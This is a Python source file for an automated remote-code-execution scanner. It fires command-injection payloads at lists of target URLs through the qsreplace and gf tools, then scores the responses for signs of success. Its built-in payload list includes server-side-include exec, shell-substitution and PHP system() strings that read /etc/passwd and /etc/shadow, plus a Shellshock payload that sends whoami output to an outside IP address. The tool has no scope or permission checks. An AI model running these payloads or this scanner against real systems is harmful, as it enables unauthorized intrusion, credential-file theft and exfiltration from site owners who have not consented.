import os
import subprocess
import urllib.parse
import time
import logging
import sys
import signal
import json
import csv
import zipfile
import yaml
import shutil
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import argparse
from tqdm import tqdm
import datetime
import multiprocessing
import validators
import traceback
import html
from tabulate import tabulate
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init(autoreset=True)

# Handle SIGINT gracefully
stop_execution = False

def signal_handler(sig, frame):
    global stop_execution
    logging.warning("Received SIGINT. Saving partial results and exiting...")
    print("\n" + Fore.YELLOW + "Received Ctrl+C. Saving partial results and exiting...")
    stop_execution = True

signal.signal(signal.SIGINT, signal_handler)

# Set up logging
logging.basicConfig(
    filename='rce_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def load_config(config_file="rce_config.yaml"):
    """Load configuration from a YAML file if available."""
    default_config = {
        "url_file": None,
        "payload_file": None,
        "max_workers": multiprocessing.cpu_count(),
        "timeout": 30,
        "qsreplace_path": None,
        "gf_path": None,
        "retries": 2,
        "quiet": False,
        "verbose": False,
        "dry_run": False,
        "table_style": "fancy_grid",
        "max_urls": None
    }
    if os.path.isfile(config_file):
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                config = yaml.safe_load(f) or {}
            default_config.update(config)
            logging.info(f"Loaded configuration from {config_file}")
        except Exception as e:
            logging.error(f"Error loading config {config_file}: {str(e)}")
            print(Fore.RED + f"Error loading config {config_file}: {str(e)}")
    return default_config

def find_command(command, custom_path=None):
    """Dynamically locate a command in PATH or common locations."""
    common_paths = [
        "/usr/local/bin",
        "/usr/bin",
        os.path.expanduser("~/.npm-global/bin"),
        os.path.expanduser("~/bin")
    ]
    env_path = os.getenv(f"{command.upper()}_PATH")
    
    for path in [custom_path, env_path]:
        if path and os.path.isfile(path) and os.access(path, os.X_OK):
            logging.info(f"Found {command} at {path}")
            return path
    path = shutil.which(command)
    if path:
        logging.info(f"Found {command} in PATH: {path}")
        return path
    for dir_path in common_paths:
        full_path = os.path.join(dir_path, command)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            logging.info(f"Found {command} at {full_path}")
            return full_path
    return None

def check_command(command, custom_path=None):
    """Check if a command is available and functional."""
    cmd_path = find_command(command, custom_path)
    if not cmd_path:
        logging.error(f"{command} not found. Install it with: npm install -g {command} (for qsreplace) or check gf installation.")
        print(Fore.RED + f"Error: {command} not found. Install it with: npm install -g {command} (for qsreplace) or check gf installation.")
        return None
    try:
        result = subprocess.run([cmd_path, "-h"], capture_output=True, text=True, timeout=5)
        if result.returncode == 0 or "usage" in result.stdout.lower() or "usage" in result.stderr.lower():
            logging.info(f"{command} is functional at {cmd_path}")
            return cmd_path
        else:
            logging.warning(f"{command} at {cmd_path} returned unexpected output")
            print(Fore.YELLOW + f"Warning: {command} at {cmd_path} may not be functional")
            return None
    except Exception as e:
        logging.error(f"Error checking {command}: {str(e)}")
        print(Fore.RED + f"Error checking {command}: {str(e)}")
        return None

def validate_file(file_path):
    """Validate if a file exists, is readable, and is not empty."""
    if not file_path:
        return False
    try:
        if not os.path.isfile(file_path):
            logging.error(f"File not found: {file_path}")
            print(Fore.RED + f"Error: File '{file_path}' not found.")
            return False
        if not os.access(file_path, os.R_OK):
            logging.error(f"File not readable: {file_path}")
            print(Fore.RED + f"Error: File '{file_path}' is not readable.")
            return False
        if os.path.getsize(file_path) == 0:
            logging.error(f"File is empty: {file_path}")
            print(Fore.RED + f"Error: File '{file_path}' is empty.")
            return False
        return True
    except Exception as e:
        logging.error(f"Error validating file {file_path}: {str(e)}")
        print(Fore.RED + f"Error validating file '{file_path}': {str(e)}")
        return False

def validate_url(url):
    """Validate if a string is a valid URL."""
    return validators.url(url) is True

def create_output_dir(url):
    """Create a directory named after the domain of the URL."""
    domain = urllib.parse.urlparse(url).netloc.replace(':', '_')
    output_dir = f"rce_results_{domain}"
    try:
        Path(output_dir).mkdir(exist_ok=True)
        return output_dir
    except Exception as e:
        logging.error(f"Error creating directory for {url}: {str(e)}")
        print(Fore.RED + f"Error creating directory for {url}: {str(e)}")
        return None

def sanitize_filename(url, payload):
    """Sanitize URL and payload to create a valid filename with timestamp."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    url_part = urllib.parse.quote(url, safe='').replace('/', '_').replace(':', '_')
    payload_part = urllib.parse.quote(payload[:10], safe='').replace('/', '_').replace(':', '_')
    return f"{url_part}_{payload_part}_{timestamp}"

def score_payload_output(output, error):
    """Score payload output for potential RCE success."""
    if error:
        return 0
    keywords = [
        "uid=", "gid=", "root:", "etc/passwd", "etc/shadow", "vulnerable", "bash", 
        "whoami", "uname -a", "id:", "successfully executed"
    ]
    score = sum(2 if keyword in output.lower() else 0 for keyword in keywords)
    if any(cmd in output.lower() for cmd in ["command not found", "permission denied"]):
        score -= 1
    return max(0, score)

def run_qsreplace(url, payload, output_dir, timeout, args, qsreplace_path):
    """Run qsreplace with a single payload on a URL and save output."""
    if stop_execution:
        return None
    if args.dry_run:
        logging.info(f"[Dry Run] Would test {url} with payload: {payload}")
        if not args.quiet:
            print(Fore.CYAN + f"[Dry Run] Would test {url} with payload {payload[:10]}...")
        return {"url": url, "payload": payload, "status": "dry_run", "output": "", "error": "", "score": 0}

    output_file = os.path.join(output_dir, f"{sanitize_filename(url, payload)}.txt")
    result = {"url": url, "payload": payload, "status": "success", "output": "", "error": "", "score": 0}
    logging.info(f"Testing {url} with payload: {payload}")

    for attempt in range(args.retries + 1):
        try:
            cmd = [qsreplace_path, "-u", url, payload]
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            result["output"] = process.stdout + process.stderr
            result["score"] = score_payload_output(result["output"], result["error"])

            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(f"URL: {url}\nPayload: {payload}\nScore: {result['score']}\n\nOutput:\n{result['output']}")
            logging.info(f"Results saved for {url} with payload {payload[:10]} in {output_file}")
            if not args.quiet:
                color = Fore.RED if result["score"] > 0 else Fore.GREEN
                print(color + f"Results saved for {url} with payload {payload[:10]}... in {output_file} (Score: {result['score']})")
            return result
        except subprocess.TimeoutExpired:
            result["status"] = "timeout"
            result["error"] = f"Timeout after {timeout} seconds"
            logging.warning(f"Attempt {attempt + 1}/{args.retries + 1}: Timeout for {url} with payload {payload[:10]}")
            if not args.quiet:
                print(Fore.YELLOW + f"Attempt {attempt + 1}/{args.retries + 1}: Timeout for {url} with payload {payload[:10]}...")
        except Exception as e:
            result["status"] = "error"
            result["error"] = str(e)
            logging.error(f"Attempt {attempt + 1}/{args.retries + 1}: Error for {url} with payload {payload[:10]}: {str(e)}")
            if not args.quiet:
                print(Fore.RED + f"Attempt {attempt + 1}/{args.retries + 1}: Error for {url} with payload {payload[:10]}...: {str(e)}")
        if attempt < args.retries:
            time.sleep(1)
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(f"URL: {url}\nPayload: {payload}\nScore: {result['score']}\n\nError: {result['error']}")
    return result

def extract_rce_params(url_file, args, gf_path):
    """Run the pipeline: cat url_file | gf rce | tee -a rce_all_params.txt"""
    if not gf_path:
        logging.warning("gf not available, skipping RCE parameter extraction")
        if not args.quiet:
            print(Fore.YELLOW + "Warning: gf not available, skipping RCE parameter extraction")
        return []
    try:
        cmd = f"cat {url_file} | {gf_path} rce | tee -a rce_all_params.txt"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            logging.info("RCE parameters extracted and appended to rce_all_params.txt")
            if not args.quiet:
                print(Fore.GREEN + "RCE parameters extracted and appended to rce_all_params.txt")
            try:
                with open("rce_all_params.txt", 'r', encoding='utf-8') as f:
                    urls = [line.strip() for line in f.readlines() if line.strip() and validate_url(line.strip())]
                return list(set(urls))
            except Exception as e:
                logging.error(f"Error reading rce_all_params.txt: {str(e)}")
                if not args.quiet:
                    print(Fore.RED + f"Error reading rce_all_params.txt: {str(e)}")
                return []
        else:
            logging.error(f"GF pipeline failed: {result.stderr}")
            if not args.quiet:
                print(Fore.RED + f"Error running gf pipeline: {result.stderr}")
            return []
    except Exception as e:
        logging.error(f"Error in gf pipeline: {str(e)}")
        if not args.quiet:
            print(Fore.RED + f"Error in gf pipeline: {str(e)}")
        return []

def load_urls(url_file, single_url, args):
    """Load URLs from file, stdin, or single URL, streaming to handle large files."""
    urls = []
    if single_url:
        if validate_url(single_url):
            urls = [single_url]
            logging.info(f"Using single URL: {single_url}")
            if not args.quiet:
                print(Fore.GREEN + f"Using single URL: {single_url}")
        else:
            logging.error(f"Invalid URL: {single_url}")
            print(Fore.RED + f"Error: Invalid URL: {single_url}")
            return []
    elif url_file:
        if not validate_file(url_file):
            return []
        try:
            with open(url_file, 'r', encoding='utf-8') as f:
                for line in f:
                    url = line.strip()
                    if url and validate_url(url):
                        urls.append(url)
                        if args.max_urls and len(urls) >= args.max_urls:
                            break
            logging.info(f"Loaded {len(urls)} URLs from {url_file}")
            if not args.quiet:
                print(Fore.GREEN + f"Loaded {len(urls)} URLs from {url_file}")
        except Exception as e:
            logging.error(f"Error reading URL file {url_file}: {str(e)}")
            print(Fore.RED + f"Error reading URL file: {str(e)}")
            return []
    elif not sys.stdin.isatty():
        for line in sys.stdin:
            url = line.strip()
            if url and validate_url(url):
                urls.append(url)
                if args.max_urls and len(urls) >= args.max_urls:
                    break
        logging.info(f"Loaded {len(urls)} URLs from stdin")
        if not args.quiet:
            print(Fore.GREEN + f"Loaded {len(urls)} URLs from stdin")
    
    return list(set(urls))

def load_payloads(payload_file, single_payload, args):
    """Load payloads from a file, single payload, or defaults, streaming to handle large files."""
    payloads = []
    if single_payload:
        payloads = [single_payload]
        logging.info(f"Using single payload: {single_payload}")
        if not args.quiet:
            print(Fore.GREEN + f"Using single payload: {single_payload}")
    elif payload_file and validate_file(payload_file):
        try:
            with open(payload_file, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            logging.info(f"Loaded {len(payloads)} payloads from {payload_file}")
            if not args.quiet:
                print(Fore.GREEN + f"Loaded {len(payloads)} payloads from {payload_file}")
        except Exception as e:
            logging.error(f"Error reading payload file {payload_file}: {str(e)}")
            print(Fore.RED + f"Error reading payload file: {str(e)}")
            return []
    elif validate_file("payloads.txt"):
        try:
            with open("payloads.txt", 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            logging.info(f"Loaded {len(payloads)} payloads from default payloads.txt")
            if not args.quiet:
                print(Fore.GREEN + f"Loaded {len(payloads)} payloads from default payloads.txt")
        except Exception as e:
            logging.error(f"Error reading default payloads.txt: {str(e)}")
            print(Fore.RED + f"Error reading default payloads.txt: {str(e)}")
            return []
    else:
        payloads = [
            "<!--#exec%20cmd=\"/bin/cat%20/etc/passwd\"-->",
            "<!--#exec%20cmd=\"/bin/cat%20/etc/shadow\"-->",
            "<!--#exec%20cmd=\"/usr/bin/id;-->",
            "/index.html|id|",
            ";id;",
            ";netstat -a;",
            ";system('cat%20/etc/passwd')",
            "|id",
            "|/usr/bin/id",
            "\\n/bin/ls -al\\n",
            "\\n/usr/bin/id\\n",
            "`id`",
            "`/usr/bin/id`",
            "a);id",
            "a;/usr/bin/id",
            ";system('id')",
            "%0Acat%20/etc/passwd",
            "%0A/usr/bin/id",
            "& ping -i 30 127.0.0.1 &",
            "`ping 127.0.0.1`",
            "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\\`whoami\\`\"",
            "() { :;}; /bin/bash -c \"sleep 1 && echo vulnerable 1\"",
            "cat /etc/hosts",
            "$(`cat /etc/passwd`)",
            "<?php system(\"cat /etc/passwd\");?>"
        ]
        logging.info(f"Using {len(payloads)} embedded default payloads")
        if not args.quiet:
            print(Fore.GREEN + f"Using {len(payloads)} embedded default payloads")
    
    return list(set(payloads))

def save_summary(results, args):
    """Save results to JSON, CSV, and HTML files."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    json_file = f"rce_summary_{timestamp}.json"
    csv_file = f"rce_summary_{timestamp}.csv"
    html_file = f"rce_summary_{timestamp}.html"
    
    # Save JSON
    try:
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2)
        logging.info(f"Saved JSON summary to {json_file}")
        if not args.quiet:
            print(Fore.GREEN + f"Saved JSON summary to {json_file}")
    except Exception as e:
        logging.error(f"Error saving JSON summary: {str(e)}")
        print(Fore.RED + f"Error saving JSON summary: {str(e)}")

    # Save CSV
    try:
        with open(csv_file, 'w', encoding='utf-8', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=["url", "payload", "status", "output", "error", "score"])
            writer.writeheader()
            for result in results:
                writer.writerow(result)
        logging.info(f"Saved CSV summary to {csv_file}")
        if not args.quiet:
            print(Fore.GREEN + f"Saved CSV summary to {csv_file}")
    except Exception as e:
        logging.error(f"Error saving CSV summary: {str(e)}")
        print(Fore.RED + f"Error saving CSV summary: {str(e)}")

    # Save HTML
    try:
        html_content = """
        <html>
        <head>
            <title>RCE Test Report</title>
            <style>
                body { font-family: Arial, sans-serif; }
                table { border-collapse: collapse; width: 100%; }
                th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
                th { background-color: #f2f2f2; cursor: pointer; }
                tr:nth-child(even) { background-color: #f9f9f9; }
                .high-score { background-color: #ffcccc; }
            </style>
            <script>
                function sortTable(n) {
                    let table = document.getElementById("results");
                    let switching = true, rows, i, shouldSwitch, dir = "asc", switchcount = 0;
                    while (switching) {
                        switching = false;
                        rows = table.rows;
                        for (i = 1; i < (rows.length - 1); i++) {
                            shouldSwitch = false;
                            let x = rows[i].getElementsByTagName("TD")[n];
                            let y = rows[i + 1].getElementsByTagName("TD")[n];
                            let xVal = n === 5 ? parseInt(x.innerHTML) : x.innerHTML.toLowerCase();
                            let yVal = n === 5 ? parseInt(y.innerHTML) : y.innerHTML.toLowerCase();
                            if (dir === "asc" && xVal > yVal || dir === "desc" && xVal < yVal) {
                                shouldSwitch = true;
                                break;
                            }
                        }
                        if (shouldSwitch) {
                            rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
                            switching = true;
                            switchcount++;
                        } else if (switchcount === 0 && dir === "asc") {
                            dir = "desc";
                            switching = true;
                        }
                    }
                }
            </script>
        </head>
        <body>
            <h1>RCE Test Report</h1>
            <table id="results">
                <tr>
                    <th onclick="sortTable(0)">URL</th>
                    <th onclick="sortTable(1)">Payload</th>
                    <th onclick="sortTable(2)">Status</th>
                    <th onclick="sortTable(3)">Output</th>
                    <th onclick="sortTable(4)">Error</th>
                    <th onclick="sortTable(5)">Score</th>
                </tr>
        """
        for result in sorted(results, key=lambda x: x["score"], reverse=True):
            row_class = "high-score" if result["score"] > 0 else ""
            output_snippet = html.escape(result["output"][:100] + '...' if len(result["output"]) > 100 else result["output"])
            html_content += f"""
                <tr class="{row_class}">
                    <td>{html.escape(result["url"])}</td>
                    <td>{html.escape(result["payload"])}</td>
                    <td>{html.escape(result["status"])}</td>
                    <td>{output_snippet}</td>
                    <td>{html.escape(result["error"])}</td>
                    <td>{result["score"]}</td>
                </tr>
            """
        html_content += """
            </table>
        </body>
        </html>
        """
        with open(html_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        logging.info(f"Saved HTML report to {html_file}")
        if not args.quiet:
            print(Fore.GREEN + f"Saved HTML report to {html_file}")
    except Exception as e:
        logging.error(f"Error saving HTML report: {str(e)}")
        print(Fore.RED + f"Error saving HTML report: {str(e)}")

def zip_results(args):
    """Compress result directories into a ZIP file."""
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    zip_file = f"rce_results_{timestamp}.zip"
    try:
        with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk('.'):
                if root.startswith('rce_results_'):
                    for file in files:
                        zf.write(os.path.join(root, file))
        logging.info(f"Compressed results to {zip_file}")
        if not args.quiet:
            print(Fore.GREEN + f"Compressed results to {zip_file}")
    except Exception as e:
        logging.error(f"Error creating ZIP file: {str(e)}")
        print(Fore.RED + f"Error creating ZIP file: {str(e)}")

def load_state(state_file="rce_state.json"):
    """Load state to resume processing."""
    if os.path.isfile(state_file):
        try:
            with open(state_file, 'r', encoding='utf-8') as f:
                return set(json.load(f).get("processed_urls", []))
        except Exception as e:
            logging.error(f"Error loading state file {state_file}: {str(e)}")
            print(Fore.RED + f"Error loading state file: {str(e)}")
    return set()

def save_state(processed_urls, state_file="rce_state.json"):
    """Save state of processed URLs."""
    try:
        with open(state_file, 'w', encoding='utf-8') as f:
            json.dump({"processed_urls": list(processed_urls)}, f)
        logging.info(f"Saved state to {state_file}")
    except Exception as e:
        logging.error(f"Error saving state file {state_file}: {str(e)}")
        print(Fore.RED + f"Error saving state file: {str(e)}")

def print_results(results, args):
    """Print a tabular summary of results."""
    if args.no_print or not results:
        return
    table = []
    for result in sorted(results, key=lambda x: x["score"], reverse=True):
        color = Fore.RED if result["score"] > 0 else Fore.RESET
        output_snippet = result["output"][:50] + '...' if len(result["output"]) > 50 else result["output"]
        table.append([
            color + result["url"],
            color + result["payload"][:20] + ('...' if len(result["payload"]) > 20 else ''),
            color + result["status"],
            color + output_snippet,
            color + result["error"],
            color + str(result["score"])
        ])
    headers = ["URL", "Payload", "Status", "Output", "Error", "Score"]
    print("\n" + Fore.CYAN + "=== RCE Test Results ===")
    print(tabulate(table, headers=headers, tablefmt=args.table_style, stralign="left"))
    print(Fore.CYAN + f"Total Results: {len(results)} (High-score results in red)")
    logging.info("Printed results summary")

def process_url(url, payloads, timeout, args, qsreplace_path, processed_urls):
    """Process a single URL with all payloads."""
    if stop_execution or url in processed_urls:
        return []
    if not validate_url(url):
        logging.warning(f"Skipping invalid URL: {url}")
        if not args.quiet:
            print(Fore.YELLOW + f"Skipping invalid URL: {url}")
        return []
    
    output_dir = create_output_dir(url)
    if not output_dir:
        return []
    
    results = []
    with ThreadPoolExecutor(max_workers=args.max_workers) as executor:
        future_to_payload = {executor.submit(run_qsreplace, url, p, output_dir, timeout, args, qsreplace_path): p for p in payloads}
        for future in tqdm(
            executor._futures,
            total=len(payloads),
            desc=f"Payloads for {url}",
            leave=False,
            disable=args.quiet
        ):
            try:
                result = future.result()
                if result:
                    results.append(result)
            except Exception as e:
                logging.error(f"Error processing payload for {url}: {str(e)}")
                if not args.quiet:
                    print(Fore.RED + f"Error processing payload for {url}: {str(e)}")
                results.append({"url": url, "payload": "", "status": "error", "output": "", "error": str(e), "score": 0})
    
    processed_urls.add(url)
    return results

def main(args):
    global stop_execution
    # Check for qsreplace
    qsreplace_path = check_command("qsreplace", args.qsreplace_path)
    if not qsreplace_path:
        logging.error("qsreplace is required. Exiting.")
        print(Fore.RED + "Error: qsreplace is required. Exiting.")
        return

    # Check for gf
    gf_path = check_command("gf", args.gf_path)

    # Load state for resuming
    processed_urls = load_state() if args.resume else set()

    # Load URLs
    urls = load_urls(args.url_file, args.single_url, args)
    if not urls:
        logging.error("No valid URLs provided. Exiting.")
        print(Fore.RED + "Error: No valid URLs provided. Exiting.")
        return

    # Try gf pipeline if URL file is provided and gf is available
    if args.url_file and gf_path:
        gf_urls = extract_rce_params(args.url_file, args, gf_path)
        if gf_urls:
            urls = list(set(urls + gf_urls))

    # Filter out processed URLs
    urls = [url for url in urls if url not in processed_urls]
    if not urls:
        logging.info("All URLs already processed. Exiting.")
        print(Fore.GREEN + "All URLs already processed. Exiting.")
        return

    # Apply max_urls limit
    if args.max_urls:
        urls = urls[:args.max_urls]

    # Load payloads
    payloads = load_payloads(args.payload_file, args.single_payload, args)
    if not payloads:
        logging.error("No payloads available. Exiting.")
        print(Fore.RED + "No payloads available. Exiting.")
        return

    # Process URLs in batches
    batch_size = 100
    all_results = []
    start_time = time.time()
    
    for i in range(0, len(urls), batch_size):
        if stop_execution:
            break
        batch = urls[i:i + batch_size]
        for url in tqdm(batch, desc="Processing URLs", unit="URL", disable=args.quiet):
            try:
                results = process_url(url, payloads, args.timeout, args, qsreplace_path, processed_urls)
                all_results.extend(results)
                save_state(processed_urls)
            except Exception as e:
                logging.error(f"Error processing {url}: {str(e)}", exc_info=True)
                if not args.quiet:
                    print(Fore.RED + f"Error processing {url}: {str(e)}")
                all_results.append({"url": url, "payload": "", "status": "error", "output": "", "error": str(e), "score": 0})

    # Save results
    if all_results:
        save_summary(all_results, args)
        zip_results(args)
        print_results(all_results, args)

    elapsed = time.time() - start_time
    logging.info(f"Completed in {elapsed:.2f} seconds")
    if not args.quiet:
        print(Fore.GREEN + f"Completed in {elapsed:.2f} seconds")

if __name__ == "__main__":
    config = load_config()
    parser = argparse.ArgumentParser(description="Ultimate RCE Testing Script with qsreplace and gf")
    parser.add_argument("--url-file", help="Path to file containing target URLs", default=config["url_file"])
    parser.add_argument("--single-url", help="Single URL to test")
    parser.add_argument("--payload-file", help="Path to file containing payloads", default=config["payload_file"])
    parser.add_argument("--single-payload", help="Single payload to test")
    parser.add_argument("--max-workers", type=int, default=config["max_workers"], help=f"Max concurrent workers (default: {config['max_workers']})")
    parser.add_argument("--timeout", type=int, default=config["timeout"], help=f"Timeout for qsreplace in seconds (default: {config['timeout']})")
    parser.add_argument("--qsreplace-path", help="Custom path to qsreplace executable", default=config["qsreplace_path"])
    parser.add_argument("--gf-path", help="Custom path to gf executable", default=config["gf_path"])
    parser.add_argument("--retries", type=int, default=config["retries"], help=f"Number of retries for qsreplace (default: {config['retries']})")
    parser.add_argument("--max-urls", type=int, default=config["max_urls"], help="Maximum number of URLs to process")
    parser.add_argument("--quiet", action="store_true", default=config["quiet"], help="Suppress console output except errors")
    parser.add_argument("--verbose", action="store_true", default=config["verbose"], help="Enable verbose output")
    parser.add_argument("--dry-run", action="store_true", default=config["dry_run"], help="Simulate execution without running qsreplace")
    parser.add_argument("--resume", action="store_true", help="Resume from previous run using state file")
    parser.add_argument("--no-print", action="store_true", help="Skip printing results table")
    parser.add_argument("--table-style", default=config["table_style"], help="Table style for results (e.g., fancy_grid, simple)")
    args = parser.parse_args()

    if args.verbose:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.DEBUG)
        logging.getLogger().addHandler(console_handler)

    try:
        main(args)
    except Exception as e:
        logging.error(f"Fatal error: {str(e)}", exc_info=True)
        print(Fore.RED + f"Fatal error: {str(e)}")
        sys.exit(1)
